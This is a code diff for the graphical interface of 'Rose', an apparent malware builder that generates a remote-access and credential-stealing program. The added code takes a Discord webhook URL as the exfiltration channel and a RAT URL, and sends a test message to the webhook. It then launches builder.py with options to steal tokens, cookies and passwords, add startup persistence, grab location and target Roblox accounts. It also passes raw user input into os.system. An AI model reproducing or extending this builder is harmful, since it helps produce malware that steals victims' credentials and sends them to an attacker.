@@ -1,11 +1,20 @@
 import psocials
+import builder
 
 from flaskwebgui import FlaskUI
 from nicegui import ui
 import requests
-import time
+import random
+import threading
 
-__title__ = 'Rose RAT Builder'
+from dhooks import Webhook, Embed 
+import os 
+from bs4 import BeautifulSoup
+import shutil 
+from pathlib import Path
+import subprocess
+
+__title__ = 'Rose UI Builder'
 __avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/RoseWBG.png'
 __version__ = '1.0'
 
@@ -22,6 +31,10 @@ xroblox = False
 xrat = False
 xraturl = ""
 xping = False
+xwehookurl = ""
+xbuildname = ""
+
+xprogressvalue = False
  
  
 def change_startups():
@@ -107,8 +120,76 @@ def change_pings():
         return
     ui.notify("Ping has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
     
+def change_wehookurl(value):
+    global xwehookurl
+    xwehookurl = value
+    
+def change_buildname(value):
+    global xbuildname
+    xbuildname = value
+    
+async def _test_webhook():
+    result = await builder.test_webhook(xwehookurl)
+    if result == 0:
+        ui.notify("WebHook successfuly executed!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
+        return 
+    ui.notify("WebHook failed to execute!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+
+
+__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png"
+
+
+async def test_webhook(webhook_url):
+    try:
+        async with Webhook.Async(webhook_url) as hook:
+            embed = Embed(
+                description='Webhook is Working',
+                color=11795068,
+                timestamp="now"
+            )
+            embed.set_author(name="Success", icon_url=__icon__)
+            embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
+            await hook.send(embed=embed)
+        return 0
+    except Exception as e:
+        print(e)
+        return 1
+            
+def __build():
+    path = f'{Path(__file__).resolve().parent}\\builder.py'
+    print(path)
+    os.system(f"start /wait cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjections} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox}")
+    #xwehookurl, xrat, xraturl, xstartup, xinjections, xtoken, xcookie, xpassword, xmalicious, xlocation, xroblox
+    ui.notify("Build has finished!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
+                    
+def _makebuild():
+    if xwehookurl == "":
+        ui.notify("WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+        return 
+    if xbuildname == "":
+        ui.notify("Build Name is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+        return
+    if xrat:
+        if xraturl == "":
+            ui.notify("RAT URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+            return
+        
+    ui.notify("Build has been started!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
+    __build()
+    
+class Demo:
+    def __init__(self):
+        self.number = xprogressvalue
+
 def _home():
-    ui.button('Build')
+    with ui.column():
+        with ui.expansion('Infos', icon='star_rate').classes('w-full'):
+            ui.input(label='WebHook URL', placeholder='Rose on top baby',
+                    on_change=lambda e: change_wehookurl(e.value)).props('inline color=pink-3')
+            ui.input(label='Build Name', placeholder='Rose on top baby',
+                    on_change=lambda e: change_buildname(e.value)).props('inline color=pink-3')
+        ui.button('Test WebHook', on_click=_test_webhook).props("icon=code color=purple-11").classes('w-full')
+        ui.button('Build', on_click=_makebuild).props("icon=build color=pink-3").classes('w-full')
 
 def _functions():
     with ui.column():
@@ -187,7 +268,7 @@ def superhome():
         ui.tab('Home', icon='home')
         ui.tab('Functions', icon='fingerprint')
         with ui.tab('Socials', icon='face'):
-            ui.badge('0', color='red').props('floating')
+            ui.badge('0', color='purple-11').props('floating')
             
     with ui.tab_panels(tabs, value='Home').classes('bg-transparent').classes('w-full center'):
         with ui.tab_panel('Home'):
